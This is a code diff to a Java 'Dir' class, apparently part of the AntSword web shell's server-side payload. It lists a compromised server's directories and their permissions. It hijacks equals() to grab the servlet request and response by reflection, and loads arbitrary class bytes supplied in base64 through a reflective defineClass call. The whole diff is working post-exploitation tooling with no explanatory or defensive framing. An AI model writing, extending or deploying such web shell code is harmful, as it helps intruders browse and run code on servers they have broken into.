@@ -1,7 +1,5 @@
 package filemanager;
 
-import com.sun.org.apache.xpath.internal.operations.Bool;
-
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.File;
@@ -13,40 +11,16 @@ import java.text.SimpleDateFormat;
 public class Dir {
     public HttpServletRequest request = null;
     public HttpServletResponse response = null;
-    public String encoder;
-    public String cs;
-    public String randomPrefix;
+    public String encoder = "base64";
+    public String cs = "antswordCharset";
+    public String randomPrefix = "antswordrandomPrefix";
     public String decoderClassdata;
 
     @Override
     public boolean equals(Object obj) {
-        try {
-            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
-            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
-            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
-        } catch (Exception e) {
-            if (obj instanceof HttpServletRequest) {
-                request = (HttpServletRequest) obj;
-                try {
-                    Field req = request.getClass().getDeclaredField("request");
-                    req.setAccessible(true);
-                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
-                    Field resp = request2.getClass().getDeclaredField("response");
-                    resp.setAccessible(true);
-                    response = (HttpServletResponse) resp.get(request2);
-                } catch (Exception ex) {
-                    try {
-                        response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
-                    } catch (Exception ignored) {
-
-                    }
-                }
-            }
-        }
-        randomPrefix = "antswordrandomPrefix";
-        encoder = "base64";
+        this.parseObj(obj);
         cs = String.valueOf(Charset.forName(System.getProperty("sun.jnu.encoding")));
-        StringBuffer output = new StringBuffer("");
+        StringBuffer output = new StringBuffer();
         String tag_s = "->|";
         String tag_e = "|<-";
         String varkey1 = "antswordargpath";
@@ -96,8 +70,8 @@ public class Dir {
             sQ = l[i].canRead() ? "R" : "-";
             sQ += l[i].canWrite() ? "W" : "-";
             try {
-                sQ +=  ((Boolean) l[i].getClass().getMethod("canExecute").invoke(l[i])) ? "X" : "-";
-            }catch (Exception e) {
+                sQ += ((Boolean) l[i].getClass().getMethod("canExecute").invoke(l[i])) ? "X" : "-";
+            } catch (Exception e) {
                 sQ += "-";
             }
             String nm = l[i].getName();
@@ -111,10 +85,42 @@ public class Dir {
         return s;
     }
 
+    public void parseObj(Object obj) {
+        if (obj.getClass().isArray()) {
+            Object[] data = (Object[]) obj;
+            request = (HttpServletRequest) data[0];
+            response = (HttpServletResponse) data[1];
+        } else {
+            try {
+                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
+                request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
+                response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
+            } catch (Exception e) {
+                if (obj instanceof HttpServletRequest) {
+                    request = (HttpServletRequest) obj;
+                    try {
+                        Field req = request.getClass().getDeclaredField("request");
+                        req.setAccessible(true);
+                        HttpServletRequest request2 = (HttpServletRequest) req.get(request);
+                        Field resp = request2.getClass().getDeclaredField("response");
+                        resp.setAccessible(true);
+                        response = (HttpServletResponse) resp.get(request2);
+                    } catch (Exception ex) {
+                        try {
+                            response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
+                        } catch (Exception ignored) {
+
+                        }
+                    }
+                }
+            }
+        }
+    }
+
     public String asoutput(String str) {
         try {
             byte[] classBytes = Base64DecodeToByte(decoderClassdata);
-            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
+            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClassMethod.setAccessible(true);
             Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), classBytes, 0, classBytes.length);
             return cc.getConstructor(String.class).newInstance(str).toString();
